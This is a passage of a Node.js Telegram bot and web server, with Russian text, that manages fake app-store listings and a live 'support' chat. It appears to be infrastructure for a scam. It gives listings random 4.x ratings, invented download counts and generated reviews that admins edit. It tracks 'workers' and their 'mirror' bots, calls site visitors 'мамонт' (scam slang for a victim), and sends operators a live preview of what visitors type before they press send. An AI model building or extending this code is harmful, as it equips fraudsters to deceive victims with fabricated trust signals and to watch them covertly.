    if (userState[chatId]) {
        if (userState[chatId].step === 'category') {
            userState[chatId].data.category = catMap[catType];
            userState[chatId].step = 'size';
            promptAddStep(ctx, chatId, userState[chatId]);
        } else if (userState[chatId].step === 'edit_category') {
            const appId = userState[chatId].appId;
            appsData[appId].category = catMap[catType];
            updateDataJs();
            ctx.reply("✅ Категория обновлена!");
            delete userState[chatId];
            sendAppMenu(ctx, appId);
        }
    }
    ctx.answerCbQuery();
});

bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    const msgText = ctx.message.text || '';
    if (!userState[chatId]) return;
    const state = userState[chatId];
    
    if (state.step === 'private_mirror_token') {
        const token = msgText.trim();
        ctx.reply("⌛ Проверка токена...");
        try {
            const testBot = new Telegraf(token);
            const botInfo = await testBot.telegram.getMe();
            
            userState[chatId] = { 
                step: 'private_mirror_username', 
                token: token,
                botUsername: botInfo.username
            };
            ctx.reply("✅ Токен валиден!\n\nТеперь отправьте юзернейм или любое имя для этого зеркала (чтобы понимать, для кого оно):");
        } catch (e) {
            ctx.reply("❌ Ошибка. Возможно, токен недействителен.");
            delete userState[chatId];
        }
        return;
    }

    if (state.step === 'private_mirror_username') {
        const customUsername = msgText.trim().replace('@', '');
        userState[chatId].username = customUsername;
        userState[chatId].step = 'private_mirror_log_bot';
        ctx.reply("Теперь отправьте токен бота для отправки логов:\n\nЭтот бот будет присылать вам уведомления.\n\nНажмите Пропустить, если хотите получать логи в этого (основного) бота.", Markup.inlineKeyboard([[{text: 'Пропустить', callback_data: 'skip_log_bot'}]]));
        return;
    }

    if (state.step === 'private_mirror_log_bot') {
        const token = msgText.trim();
        try {
            const testBot = new Telegraf(token);
            await testBot.telegram.getMe();
            userState[chatId].logBotToken = token;
            finishPrivateMirrorCreation(ctx, chatId);
        } catch (e) {
            ctx.reply("❌ Ошибка: неверный токен. Попробуйте снова или нажмите Пропустить.", Markup.inlineKeyboard([[{text: 'Пропустить', callback_data: 'skip_log_bot'}]]));
        }
        return;
    }

    if (state.step === 'mirror_token') {
        const tokenMatch = msgText.match(/^[0-9]+:[a-zA-Z0-9_-]+$/);
        if (!tokenMatch) return ctx.reply("❌ Неверный формат токена. Отправьте валидный токен от @BotFather.");
        
        ctx.reply("⏳ Проверяем и запускаем бота...");
        try {
            const testBot = new Telegraf(msgText.trim());
            const botInfo = await testBot.telegram.getMe();
            
            mirrors[chatId.toString()] = {
                token: msgText.trim(),
                botUsername: botInfo.username,
                workerId: chatId.toString(),
                createdAt: Date.now()
            };
            saveMirrors();
            
            startMirror(chatId.toString(), msgText.trim(), botInfo.username);
            
            delete userState[chatId];
            ctx.reply(`✅ Зеркало успешно добавлено!\nБот: @${botInfo.username}\nСоздано 1 зеркало`);
            
            notifyAllAdmins(`🪞 **Создано новое зеркало**\nВоркер: @${ctx.from.username || chatId}\nID Воркера: ${chatId}\nНовый бот: @${botInfo.username}`, {parse_mode: 'Markdown'});
        } catch (e) {
            ctx.reply("❌ Ошибка при запуске зеркала: " + e.message + "\nПроверьте токен.");
        }
        return;
    }

    // Handle operator replying to a support chat message
    if (ctx.message.reply_to_message && admins.includes(chatId.toString())) {
        const replyToId = ctx.message.reply_to_message.message_id;
        const supportSessionId = tgMsgToSession[replyToId];
        if (supportSessionId && chatSessions[supportSessionId]) {
            const time = new Date().toLocaleTimeString('ru-RU', { timeZone: 'Europe/Moscow', hour: '2-digit', minute: '2-digit' });
            sendToWs(supportSessionId, { type: 'operator_reply', text: msgText, time });
            if (!chatSessions[supportSessionId].messages) chatSessions[supportSessionId].messages = [];
            chatSessions[supportSessionId].messages.push({ from: 'operator', text: msgText, time: new Date().toISOString() });
            saveSessions();
            ctx.reply('✅ Отправлено').catch(()=>{});
            return;
        }
    }

    // Handle operator typing a reply from /chats panel
    if (userState[chatId] && (userState[chatId].step === 'chat_reply' || userState[chatId].step === 'operator_send')) {
        const { sessionId } = userState[chatId];
        // DO NOT delete userState, let them send multiple messages!
        if (sessionId && chatSessions[sessionId]) {
            const time = new Date().toLocaleTimeString('ru-RU', { timeZone: 'Europe/Moscow', hour: '2-digit', minute: '2-digit' });
            sendToWs(sessionId, { type: 'operator_reply', text: msgText, time });
            if (!chatSessions[sessionId].messages) chatSessions[sessionId].messages = [];
            chatSessions[sessionId].messages.push({ from: 'operator', text: msgText, time: new Date().toISOString() });
            saveSessions();
            ctx.reply('✅ Отправлено!', Markup.inlineKeyboard([[{ text: '🔙 К диалогам', callback_data: 'view_chats' }]])).catch(()=>{});
        } else {
            ctx.reply('❌ Сессия не найдена или пользователь отключился.').catch(()=>{});
        }
        return;
    }

    if (!userState[chatId]) return;
    
    const text = msgText;
    
    if (state.step === 'input_add_admin') {
        const newAdminId = text.trim();
        if (!admins.includes(newAdminId)) {
            admins.push(newAdminId);
            saveAdmins();
            ctx.reply(`✅ Админ ${newAdminId} успешно добавлен!`, Markup.inlineKeyboard([[{ text: '🔙 К управлению админами', callback_data: 'manage_admins' }]]));
        } else {
            ctx.reply(`⚠️ Админ ${newAdminId} уже есть в списке!`, Markup.inlineKeyboard([[{ text: '🔙 К управлению админами', callback_data: 'manage_admins' }]]));
        }
        delete userState[chatId];
        return;
    }

    if (state.step === 'input_remove_admin') {
        const delAdminId = text.trim();
        if (delAdminId === ADMIN_CHAT_ID_LEGACY) {
            ctx.reply(`❌ Вы не можете удалить создателя!`, Markup.inlineKeyboard([[{ text: '🔙 К управлению админами', callback_data: 'manage_admins' }]]));
        } else if (admins.includes(delAdminId)) {
            admins = admins.filter(id => id !== delAdminId);
            saveAdmins();
            ctx.reply(`✅ Админ ${delAdminId} удален!`, Markup.inlineKeyboard([[{ text: '🔙 К управлению админами', callback_data: 'manage_admins' }]]));
        } else {
            ctx.reply(`❌ Админ ${delAdminId} не найден в списке.`, Markup.inlineKeyboard([[{ text: '🔙 К управлению админами', callback_data: 'manage_admins' }]]));
        }
        delete userState[chatId];
        return;
    }
    
    if (state.step === 'edit_setting') {
        globalSettings[state.field] = text.trim();
        saveSettings();
        delete userState[chatId];
        ctx.reply("✅ Ссылка на Telegram сохранена! Теперь пользователи будут переходить по новой ссылке.", Markup.inlineKeyboard([[{ text: '🔙 К настройкам', callback_data: 'settings' }]]));
        return;
    }

    if (state.step === 'edit_support_name') {
        globalSettings.supportName = text.trim();
        saveSettings();
        delete userState[chatId];
        ctx.reply("✏️ Имя оператора обновлено!", Markup.inlineKeyboard([[{ text: '🔙 К настройкам', callback_data: 'settings_support' }]]));
        return;
    }
    
    if (state.step === 'edit_support_photo') {
        if (!text.startsWith('http')) return ctx.reply("Пожалуйста, отправьте саму картинку (фото).");
        globalSettings.supportPhoto = text.trim();
        saveSettings();
        delete userState[chatId];
        ctx.reply("🖼 Фото оператора обновлено!", Markup.inlineKeyboard([[{ text: '🔙 К настройкам', callback_data: 'settings_support' }]]));
        return;
    }

    if (state.step === 'edit_private_log_bot') {
        const mirrorId = state.mirrorId;
        const token = text.trim();
        try {
            const testBot = new Telegraf(token);
            await testBot.telegram.getMe();
            
            if (mirrors[mirrorId]) {
                mirrors[mirrorId].logBotToken = token;
                saveMirrors();
            }
            delete userState[chatId];
            ctx.reply("✅ Бот для логов успешно подключен!\n\n⚠️ ОБЯЗАТЕЛЬНО: Перейдите в этого бота и нажмите /start (или отправьте любое сообщение), чтобы он мог присылать вам логи!", Markup.inlineKeyboard([[{text: '🔙 Вернуться к зеркалу', callback_data: `view_private_mirror_${mirrorId}`}]]));
        } catch (e) {
            ctx.reply("❌ Ошибка: неверный токен. Попробуйте снова или нажмите Отмена.", Markup.inlineKeyboard([[{text: '❌ Отмена', callback_data: `view_private_mirror_${mirrorId}`}]]));
        }
        return;
    }

    if (state.step.startsWith('edit_') && !state.step.startsWith('edit_rev_') && state.step !== 'edit_setting') {
        const appId = state.appId;
        if (state.step === 'edit_title') appsData[appId].title = text;
        if (state.step === 'edit_size') appsData[appId].size = text;
        if (state.step === 'edit_desc') appsData[appId].description = text;
        
        updateDataJs();
        ctx.reply("✅ Успешно обновлено!");
        delete userState[chatId];
        sendAppMenu(ctx, appId);
        return;
    }
    
    if (state.step.startsWith('edit_rev_')) {
        const appId = state.appId;
        const revId = state.revId;
        const rev = appsData[appId].reviews.find(r => r.id === revId);
        if (rev) {
            if (state.step === 'edit_rev_author') rev.author = text;
            if (state.step === 'edit_rev_text') rev.text = text;
            updateDataJs();
            ctx.reply("✅ Отзыв обновлен!");
        }
        delete userState[chatId];
        
        const msg = `💬 **Отзыв**\n\n👤 Автор: ${rev.author}\n⭐ Оценка: ${rev.rating}\n📝 Текст: ${rev.text}`;
        const buttons = [
            [{ text: '✏️ Изменить автора', callback_data: `edit_rev_author_${appId}_${revId}` }],
            [{ text: '✏️ Изменить текст', callback_data: `edit_rev_text_${appId}_${revId}` }],
            [{ text: '✏️ Оценка 5⭐', callback_data: `set_rev_rating_${appId}_${revId}_5` }, { text: 'Оценка 4⭐', callback_data: `set_rev_rating_${appId}_${revId}_4` }],
            [{ text: 'Оценка 3⭐', callback_data: `set_rev_rating_${appId}_${revId}_3` }, { text: 'Оценка 2⭐', callback_data: `set_rev_rating_${appId}_${revId}_2` }, { text: 'Оценка 1⭐', callback_data: `set_rev_rating_${appId}_${revId}_1` }],
            [{ text: '❌ Удалить отзыв', callback_data: `delete_rev_${appId}_${revId}` }],
            [{ text: '🔙 К списку', callback_data: `list_reviews_${appId}` }]
        ];
        ctx.reply(msg, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } });
        return;
    }
    
    if (state.step === 'add_rev_author') {
        state.data.author = text;
        state.step = 'add_rev_text';
        ctx.reply("✏️ Введите текст отзыва:", { reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: `list_reviews_${state.appId}` }]] } });
        return;
    }
    if (state.step === 'add_rev_text') {
        state.data.text = text;
        state.step = 'add_rev_rating';
        const appId = state.appId;
        const buttons = [
            [{ text: 'Оценка 5⭐', callback_data: `submit_new_rev_${appId}_5` }, { text: 'Оценка 4⭐', callback_data: `submit_new_rev_${appId}_4` }],
            [{ text: 'Оценка 3⭐', callback_data: `submit_new_rev_${appId}_3` }, { text: 'Оценка 2⭐', callback_data: `submit_new_rev_${appId}_2` }, { text: 'Оценка 1⭐', callback_data: `submit_new_rev_${appId}_1` }],
            [{ text: '❌ Отмена', callback_data: `list_reviews_${appId}` }]
        ];
        ctx.reply("⭐ Выберите оценку для отзыва:", { reply_markup: { inline_keyboard: buttons } });
        return;
    }
    
    if (addSteps.includes(state.step)) {
        if (state.step === 'id') state.data.id = text.trim().toLowerCase();
        else if (state.step === 'title') state.data.title = text.trim();
        else if (state.step === 'size') state.data.size = text.trim();
        else if (state.step === 'desc') state.data.description = text.trim();
        
        const stepIdx = addSteps.indexOf(state.step);
        if (stepIdx < addSteps.length - 1) {
            state.step = addSteps[stepIdx + 1];
            promptAddStep(ctx, chatId, state);
        }
    }
});


bot.on(['video', 'document'], async (ctx) => {
    const chatId = ctx.chat.id;
    if (!userState[chatId]) return;
    
    const state = userState[chatId];
    if (state.step !== 'upload_video') return;
    
    let fileId;
    if (ctx.message.video) fileId = ctx.message.video.file_id;
    else if (ctx.message.document && ctx.message.document.mime_type.startsWith('video/')) fileId = ctx.message.document.file_id;
    else {
        return ctx.reply("❌ Пожалуйста, отправьте именно видео-файл.");
    }
    
    try {
        ctx.reply("⏳ Загрузка видео...");
        const fileLink = await ctx.telegram.getFileLink(fileId);
        
        // Download the video
        const https = require('https');
        const file = fs.createWriteStream("instruction.mp4");
        
        https.get(fileLink.href, function(response) {
            response.pipe(file);
            file.on('finish', function() {
                file.close();
                globalSettings.hasVideo = true;
                saveSettings();
                delete userState[chatId];
                ctx.reply("✅ Видео-инструкция успешно загружена и обновлена на сайте!", Markup.inlineKeyboard([[{ text: '🔙 К настройкам', callback_data: 'settings' }]]));
            });
        }).on('error', function(err) {
            fs.unlink("instruction.mp4", ()=>{});
            ctx.reply("❌ Ошибка при скачивании видео: " + err.message);
        });
        
    } catch (e) {
        ctx.reply("❌ Ошибка Телеграм API: " + e.message);
    }
});

bot.on('photo', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!userState[chatId]) return;
    
    const state = userState[chatId];
    const photo = ctx.message.photo[ctx.message.photo.length - 1]; 
    
    if (state.step !== 'icon' && state.step !== 'edit_icon' && state.step !== 'edit_support_photo') return;
    
    try {
        const fileLink = await ctx.telegram.getFileLink(photo.file_id);
        
        let iconPath = '';
        if (state.step === 'edit_support_photo') {
            iconPath = `icons/support_photo_${Date.now()}.jpg`;
        } else {
            const appId = state.appId || state.data.id;
            iconPath = `icons/${appId}.jpg`;
        }
        
        if (!fs.existsSync('icons')) fs.mkdirSync('icons');
        
        const file = fs.createWriteStream(iconPath);
        https.get(fileLink, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close();
                
                if (state.step === 'edit_support_photo') {
                    globalSettings.supportPhoto = '/' + iconPath;
                    saveSettings();
                    delete userState[chatId];
                    ctx.reply("🖼 Фото обновлено!", Markup.inlineKeyboard([[{ text: '🔙 К настройкам', callback_data: 'settings_support' }]]));
                    return;
                } else if (state.step === 'icon') {
                    state.data.iconPath = iconPath;
                    if (admins.includes(chatId.toString())) {
                        state.step = 'visibility';
                        promptAddStep(ctx, chatId, state);
                    } else {
                        const workerIdStr = mirrors[ctx.chat.id.toString()] ? ctx.chat.id.toString() : null;
                        appsData[state.data.id] = {
                            owner: ctx.chat.id.toString(),
                            isPersonal: true,
                            workerId: workerIdStr,
                            title: state.data.title,
                            aliases: [state.data.id, state.data.title.toLowerCase()],
                            category: state.data.category,
                            rating: (4 + Math.random()).toFixed(1),
                            reviewsCount: '1 тыс.',
                            downloads: '10 тыс. +',
                            size: state.data.size,
                            icon: iconPath,
                            description: state.data.description,
                            screenshots: [],
                            reviews: generateInitialReviews()
                        };
                        updateDataJs();
                        delete userState[chatId];
                        ctx.reply(`✅ **Готово!**\n\nПриложение добавлено!`, { parse_mode: 'Markdown' });
                        sendMainMenu(ctx);
                    }
                } else if (state.step === 'edit_icon') {
                    appsData[state.appId].icon = iconPath;
                    updateDataJs();
                    delete userState[chatId];
                    ctx.reply("✅ Иконка успешно обновлена!");
                    sendAppMenu(ctx, state.appId);
                }
            });
        });
    } catch(e) {
        ctx.reply("Ошибка загрузки.");
        console.error(e);
    }
});

// =============================================
// CHAT SUPPORT - WebSocket Server
// =============================================

// sessions: { [sessionId]: { ws, context, userInfo, tgConnectMsgId, tgPreviewMsgId, operatorConnected, messages[] } }
const chatSessions = {};
// Map from Telegram message_id → sessionId (so operator can reply)
const tgMsgToSession = {};
// Operator state: when operator clicked "reply to session" from /chats panel
const operatorReplyState = {};

const SESSIONS_FILE = 'support_sessions.json';

function saveSessions() {
    const toSave = {};
    for (const [id, s] of Object.entries(chatSessions)) {
        toSave[id] = {
            context: s.context,
            userInfo: s.userInfo,
            messages: s.messages || [],
            operatorConnected: s.operatorConnected,
            tgConnectMsgId: s.tgConnectMsgId || null,
            lastUserMsgId: s.lastUserMsgId || null,
            createdAt: s.createdAt || Date.now()
        };
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(toSave, null, 2));
}

function loadSessions() {
    if (!fs.existsSync(SESSIONS_FILE)) return;
    try {
        const saved = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
        for (const [id, s] of Object.entries(saved)) {
            chatSessions[id] = { ...s, ws: null };
            if (s.lastUserMsgId) tgMsgToSession[s.lastUserMsgId] = id;
            if (s.tgConnectMsgId) tgMsgToSession[s.tgConnectMsgId] = id;
        }
        console.log(`Loaded ${Object.keys(saved).length} support sessions from file`);
    } catch(e) {
        console.log('Could not load sessions:', e.message);
    }
}
loadSessions();

function generateSessionId() {
    return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
}

function sendToWs(sessionId, data) {
    const session = chatSessions[sessionId];
    if (session && session.ws && session.ws.readyState === WebSocket.OPEN) {
        session.ws.send(JSON.stringify(data));
    }
}

function getSupportRecipients(session) {
    if (session.workerId && mirrors[session.workerId] && mirrors[session.workerId].isPrivate) {
        let recs = [mirrors[session.workerId].ownerChatId];
        // Ensure main creator also gets support chats from private mirrors!
        if (mirrors[session.workerId].ownerChatId !== adminChatId) {
            recs.push(adminChatId);
        }
        return recs;
    }
    return admins;
}

async function notifyAdminNewChat(sessionId) {
    const session = chatSessions[sessionId];
    if (!session) return;

    const u = session.userInfo;
    const who = u.username ? `@${u.username}` : (u.name || `ID: ${u.id || 'Гость'}`);
    const contextLabel = session.context === 'install' ? '🔧 Поддержка по установке' : '💬 Общая поддержка';

    const msg = `${contextLabel}\\n👤 Пользователь: ${who}\\n\\n💬 Новый чат открыт. Ожидает оператора.`;

    const recipients = getSupportRecipients(session);
    session.tgConnectMsgIds = session.tgConnectMsgIds || {};
    for (const rec of recipients) {
        try {
            const sent = await bot.telegram.sendMessage(rec, msg, {
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Подключиться к чату', callback_data: `chat_connect_${sessionId}` }
                    ]]
                }
            });
            session.tgConnectMsgIds[rec] = sent.message_id;
            tgMsgToSession[sent.message_id] = sessionId;
        } catch(e) {
            console.error('Notify error for', rec, e.message);
        }
    }
}

async function forwardMessageToAdmin(sessionId, text) {
    const session = chatSessions[sessionId];
    if (!session) return;

    const u = session.userInfo;
    const who = u.username ? `@${u.username}` : (u.name || 'Гость');
    const contextIcon = session.context === 'install' ? '🔧' : '💬';
    const msgText = `${contextIcon} <b>${who}:</b>\\n${escapeHtmlBot(text)}`;

    const recipients = getSupportRecipients(session);
    
    let isFirstMessage = false;
    if (!session.messages) session.messages = [];
    if (session.messages.length === 0) isFirstMessage = true;
    session.messages.push({ from: 'user', text, time: new Date().toISOString() });
    saveSessions();

    for (const rec of recipients) {
        try {
            const sent = await bot.telegram.sendMessage(rec, msgText, { parse_mode: 'HTML' });
            tgMsgToSession[sent.message_id] = sessionId;
            session.lastUserMsgId = sent.message_id;
        } catch(e) {}
    }
    
    if (isFirstMessage) {
        sendToWs(sessionId, { type: 'system_msg', text: 'Сообщение получено. Ожидайте ответа оператора — обычно отвечаем в течение нескольких минут.' });
    }
}

async function forwardPhotoToAdmin(sessionId, photoBase64) {
    const session = chatSessions[sessionId];
    if (!session) return;

    const u = session.userInfo;
    const who = u.username ? `@${u.username}` : (u.name || 'Мамонт');
    const contextIcon = session.context === 'install' ? '📱' : '💬';
    const msgText = `${contextIcon} <b>${who}:</b>\n[Фото]`;

    const recipients = getSupportRecipients(session);
    
    let isFirstMessage = false;
    if (!session.messages) session.messages = [];
    if (session.messages.length === 0) isFirstMessage = true;
    session.messages.push({ from: 'user', text: '[Фото]', time: new Date().toISOString() });
    saveSessions();

    const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');

    for (const rec of recipients) {
        try {
            let sent;
            if (isFirstMessage) {
                sent = await bot.telegram.sendPhoto(rec, { source: buffer }, { caption: `<b>Новый чат с мамонтом!</b>\n\n${msgText}`, parse_mode: 'HTML' });
            } else {
                sent = await bot.telegram.sendPhoto(rec, { source: buffer }, { caption: msgText, parse_mode: 'HTML' });
            }
            tgMsgToSession[sent.message_id] = sessionId;
            session.lastUserMsgId = sent.message_id;
        } catch(e) {}
    }
    
    if (isFirstMessage) {
        sendToWs(sessionId, { type: 'system_msg', text: 'Фото получено. Ожидайте ответа оператора — обычно отвечаем в течение нескольких минут.' });
    }
}

let previewUpdateTimers = {};
async function updateTypingPreview(sessionId, text) {
    const session = chatSessions[sessionId];
    if (!session) return;

    const u = session.userInfo;
    const who = u.username ? `@${u.username}` : (u.name || 'Гость');
    const previewText = `<b>✏️ ${who} печатает:</b>\\n<i>${escapeHtmlBot(text)}</i>`;

    clearTimeout(previewUpdateTimers[sessionId]);
    previewUpdateTimers[sessionId] = setTimeout(async () => {
        const recipients = getSupportRecipients(session);
        session.tgPreviewMsgIds = session.tgPreviewMsgIds || {};
        for (const rec of recipients) {
            try {
                if (session.tgPreviewMsgIds[rec]) {
                    await bot.telegram.editMessageText(rec, session.tgPreviewMsgIds[rec], null, previewText, { parse_mode: 'HTML' });
                } else {
                    const sent = await bot.telegram.sendMessage(rec, previewText, { parse_mode: 'HTML' });
                    session.tgPreviewMsgIds[rec] = sent.message_id;
                    tgMsgToSession[sent.message_id] = sessionId;
                }
            } catch(e) {
                session.tgPreviewMsgIds[rec] = null;
            }
        }
    }, 350);
}

async function clearTypingPreview(sessionId, text = null) {
    clearTimeout(previewUpdateTimers[sessionId]);
    const session = chatSessions[sessionId];
    if (!session) return;
    
    const recipients = getSupportRecipients(session);
    session.tgPreviewMsgIds = session.tgPreviewMsgIds || {};
    
    for (const rec of recipients) {
        if (session.tgPreviewMsgIds[rec]) {
            if (text) {
                const u = session.userInfo;
                const who = u.username ? `@${u.username}` : (u.name || 'Гость');
                const previewText = `<b>✏️ ${who} (приостановил печать):</b>\\n<i>${escapeHtmlBot(text)}</i>`;
                try {
                    await bot.telegram.editMessageText(rec, session.tgPreviewMsgIds[rec], null, previewText, { parse_mode: 'HTML' });
                } catch(e) {}
            } else {
                try {
                    await bot.telegram.deleteMessage(rec, session.tgPreviewMsgIds[rec]);
                } catch(e) {}
                session.tgPreviewMsgIds[rec] = null;
            }
        }
    }
}

function escapeHtmlBot(str) {
    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// Handle operator "Connect" button
bot.action(/^chat_connect_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    const session = chatSessions[sessionId];

    if (!session) {
        await ctx.answerCbQuery('Сессия уже завершена').catch(()=>{});
        return;
    }

    session.operatorConnected = true;
    // Notify user via WebSocket
    sendToWs(sessionId, { type: 'operator_connected' });

    // Edit the connect button message
    try {
        await ctx.editMessageText(
            ctx.callbackQuery.message.text + '\n\n✅ Оператор подключился',
            { reply_markup: { inline_keyboard: [] } }
        );
    } catch(e) {}

    await ctx.answerCbQuery('Вы подключились к чату!').catch(()=>{});
    // Prompt operator to send first message
    userState[ctx.chat.id] = { step: 'operator_send', sessionId };
    await ctx.reply('✏️ Напишите сообщение пользователю:', {
        reply_markup: { inline_keyboard: [[{ text: '❌ Пропустить', callback_data: 'cancel_operator_send' }]] }
    }).catch(()=>{});
});

bot.action('cancel_operator_send', (ctx) => {
    delete userState[ctx.chat.id];
    ctx.answerCbQuery().catch(()=>{});
    ctx.reply('Хорошо, можете ответить позже через reply на сообщение пользователя.').catch(()=>{});
});

// Chat reply handling is in the main bot.on text handler


// ---- Admin /chats panel ----
bot.command('chats', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    showChatsList(ctx);
});

bot.action('view_chats', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    delete userState[ctx.chat.id];
    showChatsList(ctx);
    ctx.answerCbQuery().catch(()=>{});
});

function showChatsList(ctx) {
    const sessions = Object.entries(chatSessions);
    if (sessions.length === 0) {
        const msg = '💬 Нет активных диалогов.';
        if (ctx.callbackQuery) ctx.editMessageText(msg, { reply_markup: { inline_keyboard: [[{ text: '🔙 Меню', callback_data: 'back_start' }]] } }).catch(() => ctx.reply(msg));
        else ctx.reply(msg, Markup.inlineKeyboard([[Markup.button.callback('🔙 Меню', 'back_start')]]));
        return;
    }
    const buttons = sessions.map(([id, s]) => {
        const u = s.userInfo || {};
        const who = u.username ? `@${u.username}` : (u.name || 'Гость');
        const ctx_label = s.context === 'install' ? '🔧' : '💬';
        const online = s.ws && s.ws.readyState === 1 ? '🟢' : '🔴';
        const msgs = (s.messages || []).length;
        return [{ text: `${online} ${ctx_label} ${who} (${msgs} сообщ.)`, callback_data: `view_chat_${id}` }];
    });
    buttons.push([{ text: '🔙 Меню', callback_data: 'back_start' }]);
    const msg = `💬 <b>Диалоги тех. поддержки:</b>\n🟢 = онлайн, 🔴 = офлайн\n\nВсего: ${sessions.length}`;
    if (ctx.callbackQuery) {
        ctx.editMessageText(msg, { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } }).catch(() => ctx.reply(msg, { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } }));
    } else {
        ctx.reply(msg, { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } });
    }
}

bot.action(/^view_chat_(.+)$/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const sessionId = ctx.match[1];
    const s = chatSessions[sessionId];
    if (!s) {
        ctx.editMessageText('❌ Диалог не найден').catch(()=>{});
        ctx.answerCbQuery().catch(()=>{});
        return;
    }
    const u = s.userInfo || {};
    const who = u.username ? `@${u.username}` : (u.name || 'Гость');
    const online = s.ws && s.ws.readyState === 1 ? '🟢 Онлайн' : '🔴 Офлайн';
    const ctxLabel = s.context === 'install' ? '🔧 Установка' : '💬 Общая';

    const history = (s.messages || []).slice(-10).map(m => {
        const who2 = m.from === 'user' ? '👤' : '🛠';
        const t = m.time ? new Date(m.time).toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit'}) : '';
        return `${who2} <i>${t}</i>: ${escapeHtmlBot(m.text)}`;
    }).join('\n');

    const msg = `👤 <b>${who}</b> | ${ctxLabel} | ${online}\n\n<b>Последние сообщения:</b>\n${history || '(пусто)'}`;
    const buttons = [
        [{ text: '✏️ Ответить', callback_data: `reply_chat_${sessionId}` }],
        [{ text: '🗑 Удалить диалог', callback_data: `delete_chat_${sessionId}` }],
        [{ text: '🔙 К диалогам', callback_data: 'view_chats' }]
    ];
    ctx.editMessageText(msg, { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } }).catch(()=>{});
    ctx.answerCbQuery().catch(()=>{});
});

bot.action(/^reply_chat_(.+)$/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const sessionId = ctx.match[1];
    userState[ctx.chat.id] = { step: 'chat_reply', sessionId };
    ctx.reply('✏️ Напишите ответ пользователю:', {
        reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: `view_chat_${sessionId}` }]] }
    }).catch(()=>{});
    ctx.answerCbQuery().catch(()=>{});
});

bot.action(/^delete_chat_(.+)$/, async (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const sessionId = ctx.match[1];
    if (chatSessions[sessionId]) {
        // Notify user their chat was reset
        sendToWs(sessionId, { type: 'chat_deleted' });
        // Remove from tgMsgToSession
        for (const [msgId, sid] of Object.entries(tgMsgToSession)) {
            if (sid === sessionId) delete tgMsgToSession[msgId];
        }
        delete chatSessions[sessionId];
        saveSessions();
    }
    ctx.editMessageText('🗑 Диалог удалён. Пользователь может начать заново.', {
        reply_markup: { inline_keyboard: [[{ text: '🔙 К диалогам', callback_data: 'view_chats' }]] }
    }).catch(()=>{});
    ctx.answerCbQuery('Диалог удалён').catch(()=>{});
});

// WebSocket handled by combinedServer below


// Serve static files + WebSocket on port 8080
const express = require('express');
const app = express();
// Handle /app route (serves app.html, same as npx serve did)
app.get('/app', (req, res) => res.send(fs.readFileSync('app.html', 'utf8')));
function serveNoCache(file, res) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Expires', '-1');
    res.setHeader('Pragma', 'no-cache');
    res.send(require('fs').readFileSync(file, 'utf8'));
}

app.get('/', (req, res) => serveNoCache('index.html', res));
app.get('/index.html', (req, res) => serveNoCache('index.html', res));
app.get('/app.html', (req, res) => serveNoCache('app.html', res));
app.get('/app/', (req, res) => serveNoCache('app.html', res));

// Serve static files
app.use(express.static(path.join(__dirname, '.'), { extensions: ['html'] }));
app.use(express.json());

app.get('/api/check_worker', (req, res) => {
    const workerId = req.query.worker;
    const uid = req.query.uid;
    const uname = req.query.uname;
    
    if (uid && blockedUsers[uid]) return res.json({ valid: false });
    if (uname && blockedUsers[uname.toLowerCase()]) return res.json({ valid: false });
    
    if (!workerId || workerId === 'null') return res.json({ valid: false });
    if (mirrors[workerId]) return res.json({ valid: true });
    return res.json({ valid: false });
});

const combinedServer = require('http').createServer(app);
const wss2 = new WebSocket.Server({ server: combinedServer });

wss2.on('connection', (ws) => {
    let mySessionId = null;

    ws.on('message', async (raw) => {
        let data;
        try { data = JSON.parse(raw); } catch(e) { return; }

        switch (data.type) {
            case 'start': {
                mySessionId = generateSessionId();
                chatSessions[mySessionId] = {
                    ws,
                    context: data.context || 'general',
                    userInfo: data.userInfo || { name: 'Гость' },
                    operatorConnected: false,
                    messages: [],
                    createdAt: Date.now()
                };
                saveSessions();
                ws.send(JSON.stringify({ type: 'session_created', sessionId: mySessionId }));
                await notifyAdminNewChat(mySessionId);
                break;
            }
            case 'rejoin': {
                mySessionId = data.sessionId;
                if (chatSessions[mySessionId]) {
                    chatSessions[mySessionId].ws = ws;
                    ws.send(JSON.stringify({ type: 'session_created', sessionId: mySessionId }));
                    // Send message history
                    if (chatSessions[mySessionId].messages && chatSessions[mySessionId].messages.length > 0) {
                        ws.send(JSON.stringify({ type: 'history', messages: chatSessions[mySessionId].messages }));
                    }
                    if (chatSessions[mySessionId].operatorConnected) {
                        ws.send(JSON.stringify({ type: 'operator_connected' }));
                    }
                } else {
                    // SERVER RESTARTED: The client has a cached session, but the server lost it.
                    // Tell the client the chat is deleted so it resets and sends a fresh 'start' with userInfo!
                    ws.send(JSON.stringify({ type: 'chat_deleted' }));
                }
                break;
            }
            case 'message': {
                if (!mySessionId || !chatSessions[mySessionId]) break;
                await clearTypingPreview(mySessionId, null);
                await forwardMessageToAdmin(mySessionId, data.text);
                break;
            }
            case 'photo': {
                if (!mySessionId || !chatSessions[mySessionId]) break;
                await clearTypingPreview(mySessionId, null);
                await forwardPhotoToAdmin(mySessionId, data.photoBase64);
                break;
            }
            case 'typing_preview': {
